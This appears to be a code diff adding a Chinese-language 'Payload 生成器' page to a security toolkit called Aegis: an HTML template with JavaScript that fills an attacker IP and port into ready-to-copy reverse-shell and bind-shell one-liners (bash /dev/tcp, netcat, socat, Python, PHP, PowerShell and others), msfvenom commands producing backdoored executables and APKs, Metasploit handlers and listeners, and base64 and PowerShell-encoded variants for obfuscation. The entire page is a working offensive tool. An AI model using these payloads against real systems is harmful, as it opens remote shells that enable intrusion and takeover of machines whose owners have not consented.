@@ -1,0 +1,222 @@
+{% extends "base.html" %}
+{% block title %}Payload 生成器 · Aegis{% endblock %}
+{% block content %}
+<div class="topbar">
+  <div class="page-head"><h1>Payload 生成器</h1></div>
+  <div style="color:var(--muted);font-size:13px">标准反弹/正向 Shell 模板 · 本地拼接不外传</div>
+</div>
+
+<div class="panel">
+  <div class="pl-cfg">
+    <div><label class="card-label">LHOST（监听 IP）</label><input id="pl-ip" value="10.0.0.1" placeholder="攻击机 IP"></div>
+    <div><label class="card-label">LPORT（端口）</label><input id="pl-port" value="4444" placeholder="端口"></div>
+    <div><label class="card-label">Shell</label>
+      <select id="pl-shell"><option>/bin/sh</option><option>/bin/bash</option><option>cmd</option><option>powershell</option></select>
+    </div>
+  </div>
+</div>
+
+<div class="filters ut-tabs" id="pl-tabs" style="flex-wrap:wrap">
+  <a class="chip active" data-tab="reverse">反弹 Shell</a>
+  <a class="chip" data-tab="bind">绑定 Shell</a>
+  <a class="chip" data-tab="msf">MSFVenom</a>
+  <a class="chip" data-tab="listen">监听器</a>
+</div>
+
+<!-- 反弹 -->
+<div class="panel pl-pane" data-pane="reverse">
+  <div class="ut-bar">
+    <select id="rev-sel" style="min-width:200px"></select>
+    <select id="rev-enc" class="ghost-sel">
+      <option value="raw">原始</option>
+      <option value="url">URL 编码</option>
+      <option value="b64">Base64</option>
+      <option value="b64sh">Base64 + bash 解码</option>
+      <option value="psb64">PowerShell -EncodedCommand</option>
+    </select>
+  </div>
+  <textarea id="rev-out" rows="4" readonly class="pl-out"></textarea>
+  <div class="ut-bar" style="margin-top:8px"><button id="rev-copy">复制</button><span id="rev-note" class="stat-sub"></span></div>
+  <hr class="pl-hr">
+  <div class="card-label">全部反弹模板（点复制即可）</div>
+  <div id="rev-all" class="ut-rows" style="margin-top:10px"></div>
+</div>
+
+<!-- 绑定 -->
+<div class="panel pl-pane hidden" data-pane="bind">
+  <p class="stat-sub" style="margin-top:0">目标机监听 <b>LPORT</b>，你用 <code>nc LHOST LPORT</code> 连过去。</p>
+  <div id="bind-all" class="ut-rows" style="margin-top:10px"></div>
+</div>
+
+<!-- MSFVenom -->
+<div class="panel pl-pane hidden" data-pane="msf">
+  <p class="stat-sub" style="margin-top:0">生成 msfvenom 命令行；生成后在攻击机执行，并用对应 handler 接收。</p>
+  <div id="msf-all" class="ut-rows" style="margin-top:10px"></div>
+  <hr class="pl-hr">
+  <div class="card-label">Metasploit 接收器（multi/handler）</div>
+  <div id="msf-handler" class="ut-rows" style="margin-top:10px"></div>
+</div>
+
+<!-- 监听器 -->
+<div class="panel pl-pane hidden" data-pane="listen">
+  <p class="stat-sub" style="margin-top:0">在攻击机执行以接收反弹连接。</p>
+  <div id="listen-all" class="ut-rows" style="margin-top:10px"></div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<style>
+.hidden{display:none!important}
+.pl-cfg{display:grid;grid-template-columns:2fr 1fr 1fr;gap:14px}
+.pl-cfg input,.pl-cfg select{width:100%}
+.ut-bar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.pl-hr{border:0;border-top:1px solid var(--line);margin:18px 0}
+.pl-out{font-family:ui-monospace,Menlo,monospace;font-size:13px;color:var(--c-cyan);background:var(--inset)}
+.ut-rows{display:flex;flex-direction:column;gap:8px}
+.rr{display:flex;align-items:flex-start;gap:10px;min-width:0}
+.rr .lab{flex:0 0 auto;width:150px;color:var(--muted);font-size:12.5px;padding-top:9px}
+.rr code{flex:1 1 auto;min-width:0;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--text);background:var(--inset);padding:9px 12px;border-radius:8px;word-break:break-all;white-space:pre-wrap;user-select:all}
+.rr .cp{flex:0 0 auto;cursor:pointer;color:var(--c-cyan);font-size:12px;padding:4px 8px;border-radius:6px;user-select:none;margin-top:5px}
+.rr .cp:hover{background:var(--inset)}
+@media(max-width:720px){.pl-cfg{grid-template-columns:1fr}}
+</style>
+<script>
+(function(){
+const $=s=>document.querySelector(s);
+const el=(t,c,x)=>{const e=document.createElement(t);if(c)e.className=c;if(x!=null)e.textContent=x;return e;};
+const encT=new TextEncoder();
+
+// 顶层标签
+document.querySelectorAll('#pl-tabs .chip').forEach(c=>c.addEventListener('click',()=>{
+  document.querySelectorAll('#pl-tabs .chip').forEach(x=>x.classList.remove('active'));c.classList.add('active');
+  document.querySelectorAll('.pl-pane').forEach(p=>p.classList.toggle('hidden',p.dataset.pane!==c.dataset.tab));
+}));
+
+function copyChip(getText){const b=el('span','cp','复制');b.addEventListener('click',()=>{Promise.resolve(navigator.clipboard.writeText(typeof getText==='function'?getText():getText)).then(()=>{b.textContent='已复制';setTimeout(()=>b.textContent='复制',1000);}).catch(()=>{});});return b;}
+function mkRow(label,value){const r=el('div','rr');r.appendChild(el('span','lab',label));const c=el('code',null,value);r.appendChild(c);r.appendChild(copyChip(()=>c.textContent));return r;}
+function setRows(box,pairs){box.textContent='';pairs.forEach(p=>box.appendChild(mkRow(p[0],p[1])));}
+
+function cfg(){
+  const ip=$('#pl-ip').value.trim()||'LHOST';
+  const port=$('#pl-port').value.trim()||'LPORT';
+  const shell=$('#pl-shell').value;
+  return {ip,port,shell};
+}
+
+// ---- 模板（{ip}{port}{shell} 占位）----
+function revTemplates(){
+  const {ip,port,shell}=cfg();
+  const S=shell==='cmd'||shell==='powershell'?'/bin/sh':shell;
+  return [
+    ['Bash -i', `${shell.startsWith('/bin')?shell:'bash'} -i >& /dev/tcp/${ip}/${port} 0>&1`],
+    ['Bash 196', `0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${S} <&196 >&196 2>&196`],
+    ['Bash read', `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`],
+    ['nc mkfifo', `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${S} -i 2>&1|nc ${ip} ${port} >/tmp/f`],
+    ['nc -e', `nc ${ip} ${port} -e ${S}`],
+    ['nc.exe -e (Win)', `nc.exe ${ip} ${port} -e cmd.exe`],
+    ['ncat', `ncat ${ip} ${port} -e ${S}`],
+    ['ncat SSL', `ncat --ssl ${ip} ${port} -e ${S}`],
+    ['socat', `socat TCP:${ip}:${port} EXEC:${S}`],
+    ['socat tty', `socat TCP:${ip}:${port} EXEC:'${S} -li',pty,stderr,setsid,sigint,sane`],
+    ['Python3', `export RHOST="${ip}";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${S}")'`],
+    ['Python (short)', `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${S}","-i"])'`],
+    ['PHP', `php -r '$sock=fsockopen("${ip}",${port});exec("${S} -i <&3 >&3 2>&3");'`],
+    ['PHP exec', `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("${S} -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`],
+    ['Perl', `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${S} -i");};'`],
+    ['Ruby', `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${S} -i <&%d >&%d 2>&%d",f,f,f)'`],
+    ['Go', `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("${S}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`],
+    ['Node.js', `require('child_process').exec('nc ${ip} ${port} -e ${S}')`],
+    ['awk', `awk 'BEGIN{s="/inet/tcp/0/${ip}/${port}";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}' /dev/null`],
+    ['Lua', `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;"`],
+    ['telnet', `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | ${S} 1>$TF`],
+    ['PowerShell', `powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sd=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sd,0,$sd.Length);$s.Flush()}"`],
+  ];
+}
+function bindTemplates(){
+  const {ip,port,shell}=cfg();const S=shell.startsWith('/bin')?shell:'/bin/sh';
+  return [
+    ['nc -e (监听)', `nc -lvp ${port} -e ${S}`],
+    ['nc mkfifo (监听)', `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${S} -i 2>&1|nc -lvp ${port} >/tmp/f`],
+    ['ncat (监听)', `ncat -lvp ${port} -e ${S}`],
+    ['socat (监听)', `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:${S}`],
+    ['Python (监听)', `python -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${port}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];subprocess.call(["${S}","-i"])'`],
+    ['PowerShell (监听)', `powershell -nop -c "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',${port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sd=([text.encoding]::ASCII).GetBytes($sb+'PS> ');$s.Write($sd,0,$sd.Length)}"`],
+    ['连接命令（攻击机）', `nc ${ip} ${port}`],
+  ];
+}
+function msfTemplates(){
+  const {ip,port}=cfg();
+  return [
+    ['Linux ELF', `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o shell.elf`],
+    ['Linux meterpreter', `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o met.elf`],
+    ['Windows EXE', `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe`],
+    ['Windows meterpreter', `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o met.exe`],
+    ['PHP', `msfvenom -p php/reverse_php LHOST=${ip} LPORT=${port} -f raw -o shell.php`],
+    ['JSP', `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o shell.jsp`],
+    ['WAR', `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip} LPORT=${port} -f war -o shell.war`],
+    ['Python', `msfvenom -p cmd/unix/reverse_python LHOST=${ip} LPORT=${port} -f raw`],
+    ['ASP', `msfvenom -p windows/shell/reverse_tcp LHOST=${ip} LPORT=${port} -f asp -o shell.asp`],
+    ['Android APK', `msfvenom -p android/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -o shell.apk`],
+  ];
+}
+function msfHandler(){
+  const {ip,port}=cfg();
+  return [
+    ['handler (shell)', `msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/shell_reverse_tcp;set LHOST ${ip};set LPORT ${port};run"`],
+    ['handler (meterpreter)', `msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST ${ip};set LPORT ${port};run"`],
+  ];
+}
+function listenTemplates(){
+  const {port}=cfg();
+  return [
+    ['netcat', `nc -lvnp ${port}`],
+    ['ncat', `ncat -lvnp ${port}`],
+    ['ncat SSL', `ncat --ssl -lvnp ${port}`],
+    ['socat (交互 tty)', `socat -d -d TCP-LISTEN:${port},reuseaddr,fork FILE:\`tty\`,raw,echo=0`],
+    ['pwncat', `pwncat-cs -lp ${port}`],
+    ['Metasploit', `msfconsole -q -x "use multi/handler;set payload linux/x64/shell_reverse_tcp;set lhost 0.0.0.0;set lport ${port};run"`],
+    ['升级为完整 tty', `python3 -c 'import pty;pty.spawn("/bin/bash")'  # 然后 Ctrl+Z; stty raw -echo; fg`],
+  ];
+}
+
+// ---- 编码 ----
+function encode(mode,text){
+  if(mode==='raw')return text;
+  if(mode==='url')return encodeURIComponent(text);
+  if(mode==='b64')return btoa(unescape(encodeURIComponent(text)));
+  if(mode==='b64sh')return `echo ${btoa(unescape(encodeURIComponent(text)))} | base64 -d | bash`;
+  if(mode==='psb64'){const u16=[];for(const ch of text){const c=ch.charCodeAt(0);u16.push(c&255,c>>8);}const b=btoa(String.fromCharCode(...u16));return `powershell -EncodedCommand ${b}`;}
+  return text;
+}
+
+// ---- 渲染 ----
+function renderReverse(){
+  const list=revTemplates();
+  const sel=$('#rev-sel');const cur=sel.value;
+  sel.innerHTML='';list.forEach((t,i)=>{const o=el('option',null,t[0]);o.value=i;sel.appendChild(o);});
+  if(cur&&list[cur])sel.value=cur;
+  updateRevOut();
+  setRows($('#rev-all'),list);
+}
+function updateRevOut(){
+  const list=revTemplates();const i=+$('#rev-sel').value||0;
+  const raw=list[i]?list[i][1]:'';
+  $('#rev-out').value=encode($('#rev-enc').value,raw);
+  $('#rev-note').textContent=list[i]?list[i][0]:'';
+}
+$('#rev-sel').addEventListener('change',updateRevOut);
+$('#rev-enc').addEventListener('change',updateRevOut);
+$('#rev-copy').onclick=()=>{navigator.clipboard.writeText($('#rev-out').value).then(()=>{$('#rev-copy').textContent='已复制';setTimeout(()=>$('#rev-copy').textContent='复制',1000);}).catch(()=>{});};
+
+function renderAll(){
+  renderReverse();
+  setRows($('#bind-all'),bindTemplates());
+  setRows($('#msf-all'),msfTemplates());
+  setRows($('#msf-handler'),msfHandler());
+  setRows($('#listen-all'),listenTemplates());
+}
+['pl-ip','pl-port','pl-shell'].forEach(id=>$('#'+id).addEventListener('input',renderAll));
+renderAll();
+})();
+</script>
+{% endblock %}
